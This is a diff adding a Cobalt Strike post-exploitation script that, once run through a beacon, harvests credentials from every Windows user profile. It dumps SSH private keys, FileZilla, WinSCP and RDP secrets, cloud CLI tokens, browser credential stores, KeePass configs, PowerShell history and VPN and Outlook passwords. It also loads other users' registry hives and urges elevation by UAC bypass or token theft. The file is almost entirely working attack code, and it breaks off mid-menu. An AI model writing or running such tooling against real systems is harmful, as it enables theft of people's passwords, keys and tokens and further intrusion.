@@ -1,0 +1,710 @@
+# loot_enum.cna — Cross-user sensitive file & credential enumeration
+#
+# Iterates C:\Users\* and checks every profile for:
+#   FileZilla, Notepad++, PuTTY, RDP, WinSCP, MobaXterm,
+#   Chrome/Firefox/Edge, SSH keys, git creds, AWS/Azure,
+#   PowerShell history, KeePass, Sticky Notes, recent files, and more.
+#
+# Most checks use PowerShell to gracefully skip missing paths.
+# Registry-based checks (PuTTY, RDP, WinSCP) load each user's NTUSER.DAT
+# via reg load when the target user is not the current session owner.
+
+# ─── helper: list all local user profile directories ────────────────────────
+
+alias users-list {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Listing user profile directories");
+    bshell($bid, "dir C:\\Users /b /ad");
+    bpowershell($bid, "Get-ChildItem C:\\Users -Directory | Select-Object Name,LastWriteTime,@{N='SizeMB';E={[math]::Round((Get-ChildItem $_.FullName -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum/1MB,1)}} | Format-Table -AutoSize");
+}
+
+# ─── access check: which user folders can we actually read? ─────────────────
+# Run this BEFORE loot-enum-all to understand your access surface.
+# Reports: current identity, token integrity, and per-user per-subdir access.
+
+alias loot-access-check {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Checking access to user profile directories");
+    bpowershell($bid, "
+# --- current identity + integrity level ---
+Write-Host '=== Current identity ===' -ForegroundColor Green
+Write-Host \"User    : \$env:USERDOMAIN\\\$env:USERNAME\"
+Write-Host \"ComputerName : \$env:COMPUTERNAME\"
+
+\$id = [Security.Principal.WindowsIdentity]::GetCurrent()
+\$wp = New-Object Security.Principal.WindowsPrincipal(\$id)
+Write-Host \"Is Admin : \$(\$wp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))\"
+
+# Token integrity via whoami /groups
+\$integ = (whoami /groups 2>\$null) | Select-String 'Mandatory Label' | Select-Object -First 1
+Write-Host \"Integrity: \$integ\"
+
+Write-Host ''
+Write-Host '=== Per-user profile access ===' -ForegroundColor Green
+
+\$subDirs = @(
+    'AppData\\Roaming',
+    'AppData\\Local',
+    'AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine',
+    'AppData\\Roaming\\FileZilla',
+    'AppData\\Roaming\\Notepad++',
+    'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
+    'AppData\\Roaming\\WinSCP.ini',
+    'AppData\\Local\\Google\\Chrome\\User Data',
+    'AppData\\Local\\Microsoft\\Edge\\User Data',
+    '.ssh',
+    '.aws',
+    '.azure',
+    'Desktop',
+    'Documents',
+    'Downloads'
+)
+
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$profile = \$_.FullName
+    \$uname   = \$_.Name
+    Write-Host \"`n--- \$uname (\$profile) ---\" -ForegroundColor Cyan
+
+    \$subDirs | ForEach-Object {
+        \$path = Join-Path \$profile \$_
+        if (Test-Path \$path) {
+            try {
+                # Attempt a real directory listing — Test-Path can mislead on ACL-denied dirs
+                \$items = Get-ChildItem \$path -ErrorAction Stop | Measure-Object
+                Write-Host \"  [READ  OK] \$_  (\$(\$items.Count) items)\" -ForegroundColor Green
+            } catch [System.UnauthorizedAccessException] {
+                Write-Host \"  [DENIED  ] \$_\" -ForegroundColor Red
+            } catch {
+                Write-Host \"  [ERROR   ] \$_  \$(\$_.Exception.Message)\" -ForegroundColor DarkYellow
+            }
+        } else {
+            Write-Host \"  [NOT EXIST] \$_\" -ForegroundColor DarkGray
+        }
+    }
+
+    # Check NTUSER.DAT readability (needed for registry hive loading)
+    \$ntuser = Join-Path \$profile 'NTUSER.DAT'
+    if (Test-Path \$ntuser) {
+        try {
+            \$fs = [System.IO.File]::Open(\$ntuser, 'Open', 'Read', 'ReadWrite')
+            \$fs.Close()
+            Write-Host \"  [NTUSER.DAT READ OK] (offline hive load possible)\" -ForegroundColor Green
+        } catch {
+            Write-Host \"  [NTUSER.DAT LOCKED/DENIED] (hive in use or no access)\" -ForegroundColor DarkYellow
+        }
+    }
+}
+
+Write-Host ''
+Write-Host '=== Registry hive access (HKLM\\SAM) ===' -ForegroundColor Green
+try {
+    \$sam = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SAM\\SAM', \$false)
+    if (\$sam) { Write-Host '[READ OK] HKLM\\SAM\\SAM — elevated access confirmed' -ForegroundColor Green }
+    else       { Write-Host '[DENIED] HKLM\\SAM\\SAM' -ForegroundColor Red }
+} catch {
+    Write-Host \"[DENIED] HKLM\\SAM\\SAM — \$(\$_.Exception.Message)\" -ForegroundColor Red
+}
+
+Write-Host ''
+Write-Host 'Recommendation:' -ForegroundColor Yellow
+if (\$wp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host '  Running as admin — full loot suite should succeed.' -ForegroundColor Green
+} else {
+    Write-Host '  Not admin — cross-user AppData access will mostly be DENIED.' -ForegroundColor Red
+    Write-Host '  Elevate first (UAC bypass / token steal) or impersonate a SYSTEM/admin token.' -ForegroundColor Red
+}
+");
+}
+
+# ─── FileZilla ───────────────────────────────────────────────────────────────
+
+alias loot-filezilla {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Hunting FileZilla credentials across all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$u = \$_.Name
+    @(
+        \"\$(\$_.FullName)\\AppData\\Roaming\\FileZilla\\recentservers.xml\",
+        \"\$(\$_.FullName)\\AppData\\Roaming\\FileZilla\\sitemanager.xml\"
+    ) | ForEach-Object {
+        if (Test-Path \$_) {
+            Write-Host \"`n[FileZilla][\$u] \$_\" -ForegroundColor Cyan
+            [xml](Get-Content \$_ -ErrorAction SilentlyContinue) | Select-Xml '//Server' | ForEach-Object {
+                \$n = \$_.Node
+                Write-Host \"  Host : \$(\$n.Host):\$(\$n.Port)  Proto:\$(\$n.Protocol)\"
+                Write-Host \"  User : \$(\$n.User)\"
+                Write-Host \"  Pass : \$(\$n.Pass)\"
+            }
+        }
+    }
+}
+");
+}
+
+# ─── WinSCP ──────────────────────────────────────────────────────────────────
+
+alias loot-winscp {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Hunting WinSCP sessions across all profiles");
+    # INI file variant
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$ini = \"\$(\$_.FullName)\\AppData\\Roaming\\WinSCP.ini\"
+    if (Test-Path \$ini) {
+        Write-Host \"`n[WinSCP INI][\$(\$_.Name)] \$ini\" -ForegroundColor Cyan
+        Get-Content \$ini | Select-String -Pattern '(HostName|UserName|Password|PortNumber)' | ForEach-Object { Write-Host \"  \$_\" }
+    }
+}
+");
+    # Registry variant for current hive
+    bshell($bid, "reg query HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions /s 2>nul");
+}
+
+# ─── PuTTY ───────────────────────────────────────────────────────────────────
+
+alias loot-putty {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Hunting PuTTY sessions and SSH known-hosts");
+    # Current user hive
+    bshell($bid, "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s 2>nul");
+    bshell($bid, "reg query HKCU\\Software\\SimonTatham\\PuTTY\\SshHostKeys 2>nul");
+    # Other users — enumerate their NTUSER.DAT
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$ntuser = \"\$(\$_.FullName)\\NTUSER.DAT\"
+    \$hive   = \"HKU\\loot_\$(\$_.Name)\"
+    if ((Test-Path \$ntuser) -and (\$_.Name -ne \$env:USERNAME)) {
+        reg load \$hive \$ntuser 2>\$null
+        \$sessions = reg query \"\$hive\\Software\\SimonTatham\\PuTTY\\Sessions\" /s 2>\$null
+        if (\$sessions) {
+            Write-Host \"`n[PuTTY][\$(\$_.Name)]\" -ForegroundColor Cyan
+            \$sessions | Write-Host
+        }
+        reg unload \$hive 2>\$null
+    }
+}
+");
+    # Portable putty known-hosts files
+    bpowershell($bid, "Get-ChildItem C:\\Users -Directory -Recurse -Include 'known_hosts','putty_known_hosts' -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"[PuTTY known_hosts] \$(\$_.FullName)\" -ForegroundColor Cyan; Get-Content \$_.FullName }");
+}
+
+# ─── MobaXterm ───────────────────────────────────────────────────────────────
+
+alias loot-mobaxterm {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Hunting MobaXterm sessions across all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    @(
+        \"\$(\$_.FullName)\\AppData\\Roaming\\MobaXterm\\MobaXterm.ini\",
+        \"\$(\$_.FullName)\\Documents\\MobaXterm\\MobaXterm.ini\"
+    ) | ForEach-Object {
+        if (Test-Path \$_) {
+            Write-Host \"`n[MobaXterm] \$_\" -ForegroundColor Cyan
+            Get-Content \$_ | Select-String -Pattern '(SubRep|ImgNum|_Proxy|Password|login|Remote)' | Select-Object -First 60 | ForEach-Object { Write-Host \"  \$_\" }
+        }
+    }
+}
+");
+    # Registry sessions
+    bshell($bid, "reg query HKCU\\Software\\Mobatek\\MobaXterm /s 2>nul");
+}
+
+# ─── RDP ─────────────────────────────────────────────────────────────────────
+
+alias loot-rdp {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Hunting saved RDP connections and .rdp files");
+    # Registry MRU and servers — current user
+    bshell($bid, "reg query \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /s 2>nul");
+    # .rdp files on disk
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    Get-ChildItem \$_.FullName -Recurse -Filter '*.rdp' -ErrorAction SilentlyContinue | ForEach-Object {
+        Write-Host \"`n[RDP file] \$(\$_.FullName)\" -ForegroundColor Cyan
+        Get-Content \$_.FullName | ForEach-Object { Write-Host \"  \$_\" }
+    }
+}
+");
+    # Other users NTUSER.DAT
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$ntuser = \"\$(\$_.FullName)\\NTUSER.DAT\"
+    \$hive   = \"HKU\\loot_rdp_\$(\$_.Name)\"
+    if ((Test-Path \$ntuser) -and (\$_.Name -ne \$env:USERNAME)) {
+        reg load \$hive \$ntuser 2>\$null
+        \$result = reg query \"\$hive\\Software\\Microsoft\\Terminal Server Client\" /s 2>\$null
+        if (\$result) {
+            Write-Host \"`n[RDP registry][\$(\$_.Name)]\" -ForegroundColor Cyan
+            \$result | Write-Host
+        }
+        reg unload \$hive 2>\$null
+    }
+}
+");
+    # Credential Manager for TERMSRV entries
+    bshell($bid, "cmdkey /list | findstr /i termsrv");
+}
+
+# ─── Notepad++ ───────────────────────────────────────────────────────────────
+
+alias loot-notepadpp {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Hunting Notepad++ sessions and unsaved backups");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$u    = \$_.Name
+    \$base = \"\$(\$_.FullName)\\AppData\\Roaming\\Notepad++\"
+
+    # session.xml — recent open files
+    \$sess = \"\$base\\session.xml\"
+    if (Test-Path \$sess) {
+        Write-Host \"`n[Notepad++ session][\$u]\" -ForegroundColor Cyan
+        [xml](Get-Content \$sess -ErrorAction SilentlyContinue) | Select-Xml '//File' | ForEach-Object {
+            Write-Host \"  \$(\$_.Node.filename)\"
+        }
+    }
+
+    # backup dir — unsaved content
+    \$bkup = \"\$base\\backup\"
+    if (Test-Path \$bkup) {
+        Write-Host \"`n[Notepad++ backups][\$u] \$bkup\" -ForegroundColor Cyan
+        Get-ChildItem \$bkup -File -ErrorAction SilentlyContinue | ForEach-Object {
+            Write-Host \"  File: \$(\$_.Name)  (\$(\$_.Length) bytes)  Modified: \$(\$_.LastWriteTime)\"
+            \$preview = Get-Content \$_.FullName -TotalCount 10 -ErrorAction SilentlyContinue
+            \$preview | ForEach-Object { Write-Host \"    \$_\" }
+        }
+    }
+}
+");
+}
+
+# ─── SSH keys ────────────────────────────────────────────────────────────────
+
+alias loot-ssh {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Hunting SSH keys and known_hosts across all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$ssh = \"\$(\$_.FullName)\\.ssh\"
+    if (Test-Path \$ssh) {
+        Write-Host \"`n[SSH dir][\$(\$_.Name)] \$ssh\" -ForegroundColor Cyan
+        Get-ChildItem \$ssh -File -ErrorAction SilentlyContinue | ForEach-Object {
+            Write-Host \"  \$(\$_.Name)  (\$(\$_.Length) bytes)\"
+            if (\$_.Name -match '^id_|^id\.' -and \$_.Name -notmatch '\.pub$') {
+                Write-Host '  [!] Private key — contents:' -ForegroundColor Yellow
+                Get-Content \$_.FullName -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"    \$_\" }
+            }
+            if (\$_.Name -eq 'config') {
+                Get-Content \$_.FullName -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"    \$_\" }
+            }
+        }
+    }
+}
+");
+}
+
+# ─── Git credentials ─────────────────────────────────────────────────────────
+
+alias loot-git {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Hunting git credentials across all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$u = \$_.Name
+    @('.gitconfig', '.git-credentials') | ForEach-Object {
+        \$f = \"\$(\$env:HOMEDRIVE)\\Users\\\$u\\\$_\"
+        if (Test-Path \$f) {
+            Write-Host \"`n[git][\$u] \$f\" -ForegroundColor Cyan
+            Get-Content \$f -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"  \$_\" }
+        }
+    }
+}
+");
+}
+
+# ─── Cloud CLI credentials (AWS / Azure / GCP) ───────────────────────────────
+
+alias loot-cloud-creds {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Hunting cloud CLI credentials across all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$u    = \$_.Name
+    \$home = \$_.FullName
+
+    # AWS
+    @(\"\$home\\.aws\\credentials\", \"\$home\\.aws\\config\") | ForEach-Object {
+        if (Test-Path \$_) {
+            Write-Host \"`n[AWS][\$u] \$_\" -ForegroundColor Cyan
+            Get-Content \$_ -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"  \$_\" }
+        }
+    }
+
+    # Azure CLI
+    \$az = \"\$home\\.azure\"
+    if (Test-Path \$az) {
+        Write-Host \"`n[Azure CLI][\$u] \$az\" -ForegroundColor Cyan
+        Get-ChildItem \$az -Filter '*.json' -ErrorAction SilentlyContinue | ForEach-Object {
+            Write-Host \"  \$(\$_.Name)  (\$(\$_.Length) bytes)\"
+        }
+        \$tok = \"\$az\\accessTokens.json\"
+        if (Test-Path \$tok) {
+            Write-Host '  [!] accessTokens.json found' -ForegroundColor Yellow
+            Get-Content \$tok -ErrorAction SilentlyContinue | Select-String 'accessToken|refreshToken|tenantId|userId' | ForEach-Object { Write-Host \"    \$_\" }
+        }
+    }
+
+    # GCP
+    \$gcp = \"\$home\\AppData\\Roaming\\gcloud\"
+    if (Test-Path \$gcp) {
+        Write-Host \"`n[GCP][\$u] \$gcp\" -ForegroundColor Cyan
+        @('credentials.db','access_tokens.db','application_default_credentials.json') | ForEach-Object {
+            \$f = \"\$gcp\\\$_\"
+            if (Test-Path \$f) { Write-Host \"  [!] \$_  (\$((Get-Item \$f).Length) bytes)\" -ForegroundColor Yellow }
+        }
+    }
+}
+");
+}
+
+# ─── PowerShell command history ───────────────────────────────────────────────
+
+alias loot-ps-history {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Dumping PowerShell command history for all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$hist = \"\$(\$_.FullName)\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"
+    if (Test-Path \$hist) {
+        Write-Host \"`n[PSHistory][\$(\$_.Name)]\" -ForegroundColor Cyan
+        Get-Content \$hist -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"  \$_\" }
+    }
+}
+");
+}
+
+# ─── Chrome ──────────────────────────────────────────────────────────────────
+
+alias loot-chrome {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Locating Chrome credential stores and history across all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$u    = \$_.Name
+    \$base = \"\$(\$_.FullName)\\AppData\\Local\\Google\\Chrome\\User Data\"
+    if (Test-Path \$base) {
+        Write-Host \"`n[Chrome][\$u] \$base\" -ForegroundColor Cyan
+        Get-ChildItem \$base -Directory -ErrorAction SilentlyContinue | Where-Object { \$_.Name -match '^Default$|^Profile' } | ForEach-Object {
+            \$prof = \$_.FullName
+            Write-Host \"  Profile: \$(\$_.Name)\"
+            @('Login Data','History','Cookies','Web Data','Bookmarks') | ForEach-Object {
+                \$f = \"\$prof\\\$_\"
+                if (Test-Path \$f) { Write-Host \"    [+] \$_  \$((Get-Item \$f).Length) bytes  modified \$((Get-Item \$f).LastWriteTime)\" }
+            }
+            # Local State holds the DPAPI-encrypted AES key for Login Data
+            \$ls = \"\$base\\Local State\"
+            if (Test-Path \$ls) {
+                \$enc = (Get-Content \$ls -Raw | ConvertFrom-Json).os_crypt.encrypted_key
+                if (\$enc) { Write-Host \"    [!] encrypted_key present in Local State (DPAPI-wrapped AES key)\" -ForegroundColor Yellow }
+            }
+        }
+    }
+}
+");
+}
+
+# ─── Firefox ─────────────────────────────────────────────────────────────────
+
+alias loot-firefox {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Locating Firefox credential stores across all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$u    = \$_.Name
+    \$base = \"\$(\$_.FullName)\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\"
+    if (Test-Path \$base) {
+        Write-Host \"`n[Firefox][\$u]\" -ForegroundColor Cyan
+        Get-ChildItem \$base -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+            Write-Host \"  Profile: \$(\$_.Name)\"
+            @('logins.json','key4.db','key3.db','places.sqlite','cookies.sqlite','signons.sqlite') | ForEach-Object {
+                \$f = \"\$(\$_.Parent.FullName)\\\$(\$_.Name)\\\$_\"
+                # fix: iterate the files in the profile
+            }
+            Get-ChildItem \$_.FullName -File -ErrorAction SilentlyContinue | Where-Object { \$_.Name -match 'logins|key[34]|places|cookies|signons' } | ForEach-Object {
+                Write-Host \"    [+] \$(\$_.Name)  \$(\$_.Length) bytes  modified \$(\$_.LastWriteTime)\"
+            }
+        }
+    }
+}
+");
+}
+
+# ─── Microsoft Edge ──────────────────────────────────────────────────────────
+
+alias loot-edge {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Locating Edge credential stores across all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$u    = \$_.Name
+    \$base = \"\$(\$_.FullName)\\AppData\\Local\\Microsoft\\Edge\\User Data\"
+    if (Test-Path \$base) {
+        Write-Host \"`n[Edge][\$u] \$base\" -ForegroundColor Cyan
+        Get-ChildItem \$base -Directory -ErrorAction SilentlyContinue | Where-Object { \$_.Name -match '^Default$|^Profile' } | ForEach-Object {
+            Write-Host \"  Profile: \$(\$_.Name)\"
+            @('Login Data','History','Cookies','Web Data') | ForEach-Object {
+                \$f = \"\$(\$_.Parent.FullName)\\\$(\$_.Name)\\\$_\"
+            }
+            Get-ChildItem \$_.FullName -File -ErrorAction SilentlyContinue | Where-Object { \$_.Name -match 'Login Data|History|Cookies|Web Data' } | ForEach-Object {
+                Write-Host \"    [+] \$(\$_.Name)  \$(\$_.Length) bytes  modified \$(\$_.LastWriteTime)\"
+            }
+        }
+    }
+}
+");
+}
+
+# ─── Sticky Notes ────────────────────────────────────────────────────────────
+
+alias loot-stickynotes {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Dumping Sticky Notes across all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$u = \$_.Name
+
+    # Legacy .snt (Windows 7/8/10 pre-1607)
+    \$snt = \"\$(\$_.FullName)\\AppData\\Roaming\\Microsoft\\Sticky Notes\\StickyNotes.snt\"
+    if (Test-Path \$snt) {
+        Write-Host \"`n[StickyNotes legacy][\$u] \$snt\" -ForegroundColor Cyan
+        Write-Host \"  Size: \$((Get-Item \$snt).Length) bytes  Modified: \$((Get-Item \$snt).LastWriteTime)\"
+    }
+
+    # Modern UWP SQLite (Windows 10 1607+)
+    \$pkg = \"\$(\$_.FullName)\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite\"
+    if (Test-Path \$pkg) {
+        Write-Host \"`n[StickyNotes modern][\$u] \$pkg\" -ForegroundColor Cyan
+        Write-Host \"  Size: \$((Get-Item \$pkg).Length) bytes  Modified: \$((Get-Item \$pkg).LastWriteTime)\"
+        # Attempt plain-text extraction via strings (no sqlite3 binary needed)
+        \$bytes = [System.IO.File]::ReadAllBytes(\$pkg)
+        \$text  = [System.Text.Encoding]::UTF8.GetString(\$bytes) -replace '[^\\x20-\\x7E\\r\\n]',''
+        \$text -split '\\n' | Where-Object { \$_.Length -gt 20 } | Select-Object -First 80 | ForEach-Object { Write-Host \"  \$_\" }
+    }
+}
+");
+}
+
+# ─── KeePass ─────────────────────────────────────────────────────────────────
+
+alias loot-keepass {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Locating KeePass databases across all profiles and common paths");
+    bpowershell($bid, "
+\$roots = @('C:\\Users','C:\\','D:\\')
+\$roots | ForEach-Object {
+    if (Test-Path \$_) {
+        Get-ChildItem \$_ -Recurse -Include '*.kdbx','*.kdb' -ErrorAction SilentlyContinue |
+            Select-Object FullName,Length,LastWriteTime |
+            ForEach-Object { Write-Host \"[KeePass] \$(\$_.FullName)  \$(\$_.Length) bytes  \$(\$_.LastWriteTime)\" -ForegroundColor Yellow }
+    }
+}
+");
+    # KeePass config (may contain master password or key file path)
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    @(
+        \"\$(\$_.FullName)\\AppData\\Roaming\\KeePass\\KeePass.config.xml\",
+        \"\$(\$_.FullName)\\AppData\\Local\\KeePass\\KeePass.config.xml\"
+    ) | ForEach-Object {
+        if (Test-Path \$_) {
+            Write-Host \"`n[KeePass config] \$_\" -ForegroundColor Cyan
+            Get-Content \$_ -ErrorAction SilentlyContinue | Select-String 'LastUsedFile|MasterPassword|KeyFilePath|RememberMaster' | ForEach-Object { Write-Host \"  \$_\" }
+        }
+    }
+}
+");
+}
+
+# ─── Windows Recent files ─────────────────────────────────────────────────────
+
+alias loot-recent {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Dumping recently accessed files across all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$recent = \"\$(\$_.FullName)\\AppData\\Roaming\\Microsoft\\Windows\\Recent\"
+    if (Test-Path \$recent) {
+        Write-Host \"`n[Recent files][\$(\$_.Name)]\" -ForegroundColor Cyan
+        Get-ChildItem \$recent -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 40 | ForEach-Object {
+            Write-Host \"  \$(\$_.LastWriteTime)  \$(\$_.Name)\"
+        }
+    }
+}
+");
+}
+
+# ─── VPN configs ─────────────────────────────────────────────────────────────
+
+alias loot-vpn {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Hunting VPN configuration files across all profiles");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$u = \$_.Name
+
+    # OpenVPN
+    @(\"\$(\$_.FullName)\\OpenVPN\\config\",\"C:\\Program Files\\OpenVPN\\config\",\"C:\\Program Files (x86)\\OpenVPN\\config\") | ForEach-Object {
+        if (Test-Path \$_) {
+            Write-Host \"`n[OpenVPN][\$u] \$_\" -ForegroundColor Cyan
+            Get-ChildItem \$_ -Include '*.ovpn','*.conf' -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+                Write-Host \"  \$(\$_.FullName)\"
+                Get-Content \$_.FullName -ErrorAction SilentlyContinue | Select-String 'remote|auth-user-pass|username|password' | ForEach-Object { Write-Host \"    \$_\" }
+            }
+        }
+    }
+
+    # Cisco AnyConnect
+    \$ac = \"\$(\$_.FullName)\\AppData\\Local\\Cisco\\Cisco AnyConnect Secure Mobility Client\"
+    if (Test-Path \$ac) {
+        Write-Host \"`n[AnyConnect][\$u] \$ac\" -ForegroundColor Cyan
+        Get-ChildItem \$ac -Recurse -ErrorAction SilentlyContinue | Select-Object FullName | ForEach-Object { Write-Host \"  \$(\$_.FullName)\" }
+    }
+}
+");
+    # Windows built-in VPN profiles
+    bpowershell($bid, "Get-VpnConnection -ErrorAction SilentlyContinue | Select-Object Name,ServerAddress,TunnelType,AuthenticationMethod,RememberCredential | Format-Table -AutoSize");
+}
+
+# ─── Outlook / email data ─────────────────────────────────────────────────────
+
+alias loot-outlook {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Locating Outlook PST/OST and mail profile credentials");
+    bpowershell($bid, "
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$u = \$_.Name
+    Get-ChildItem \$_.FullName -Recurse -Include '*.pst','*.ost' -ErrorAction SilentlyContinue | ForEach-Object {
+        Write-Host \"[Outlook][\$u] \$(\$_.FullName)  \$([math]::Round(\$_.Length/1MB,1)) MB  \$(\$_.LastWriteTime)\" -ForegroundColor Cyan
+    }
+}
+");
+    # Outlook account passwords from registry
+    bshell($bid, "reg query \"HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\" /s 2>nul | findstr /i \"password smtp imap pop3 server user\"");
+}
+
+# ─── Misc sensitive file patterns ─────────────────────────────────────────────
+
+alias loot-misc {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c9[*] Searching for generic credential / config files across all profiles");
+    bpowershell($bid, "
+\$patterns = @('*pass*','*cred*','*secret*','*token*','*apikey*','*api_key*','*.pem','*.pfx','*.p12','*.ppk','*.key','*id_rsa*','*id_dsa*','*id_ecdsa*','*id_ed25519*')
+Get-ChildItem C:\\Users -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+    \$found = Get-ChildItem \$_.FullName -Recurse -Include \$patterns -ErrorAction SilentlyContinue |
+              Where-Object { \$_.Length -lt 5MB } |
+              Select-Object FullName,Length,LastWriteTime
+    if (\$found) {
+        Write-Host \"`n[Misc loot][\$(\$_.Name)]\" -ForegroundColor Yellow
+        \$found | ForEach-Object { Write-Host \"  \$(\$_.FullName)  \$(\$_.Length) bytes  \$(\$_.LastWriteTime)\" }
+    }
+}
+");
+    # Web/app config files with creds
+    bpowershell($bid, "
+Get-ChildItem C:\\ -Recurse -Include 'web.config','app.config','appsettings.json','database.yml','*.env','.env' -ErrorAction SilentlyContinue |
+    Where-Object { \$_.Length -lt 1MB } |
+    ForEach-Object {
+        \$hits = Get-Content \$_.FullName -ErrorAction SilentlyContinue | Select-String -Pattern '(password|passwd|pwd|secret|apikey|connstr|connectionstring)' -CaseSensitive:\$false
+        if (\$hits) {
+            Write-Host \"`n[Config creds] \$(\$_.FullName)\" -ForegroundColor Yellow
+            \$hits | ForEach-Object { Write-Host \"  \$_\" }
+        }
+    }
+");
+}
+
+# ─── run-all ─────────────────────────────────────────────────────────────────
+
+alias loot-enum-all {
+    local('$bid');
+    $bid = $1;
+    blog($bid, "\c2[*] === Running full cross-user loot enumeration ===");
+    loot-access-check($bid);
+    users-list($bid);
+    loot-filezilla($bid);
+    loot-winscp($bid);
+    loot-putty($bid);
+    loot-mobaxterm($bid);
+    loot-rdp($bid);
+    loot-notepadpp($bid);
+    loot-ssh($bid);
+    loot-git($bid);
+    loot-cloud-creds($bid);
+    loot-ps-history($bid);
+    loot-chrome($bid);
+    loot-firefox($bid);
+    loot-edge($bid);
+    loot-stickynotes($bid);
+    loot-keepass($bid);
+    loot-recent($bid);
+    loot-vpn($bid);
+    loot-outlook($bid);
+    loot-misc($bid);
+}
+
+# ─── right-click menu ────────────────────────────────────────────────────────
+
+popup beacon_bottom {
+    menu "Enum: Loot (All Users)" {
+        item "[!] Access Check First"    { loot-access-check(selectedBeacons()); }
+        item "List User Profiles"        { users-list(selectedBeacons()); }
+        separator;
+        item "FileZilla"                 { loot-filezilla(selectedBeacons()); }
+        item "WinSCP"                    { loot-winscp(selectedBeacons()); }
+        item "PuTTY Sessions"            { loot-putty(selectedBeacons()); }
+        item "MobaXterm"                 { loot-mobaxterm(selectedBeacons()); }
+        item "RDP (registry + .rdp)"     { loot-rdp(selectedBeacons()); }
+        item "Notepad++ Sessions/Backup" { loot-notepadpp(selectedBeacons()); }
+        separator;
+        item "SSH Keys"                  { loot-ssh(selectedBeacons()); }
+        item "Git Credentials"           { loot-git(selectedBeacons()); }
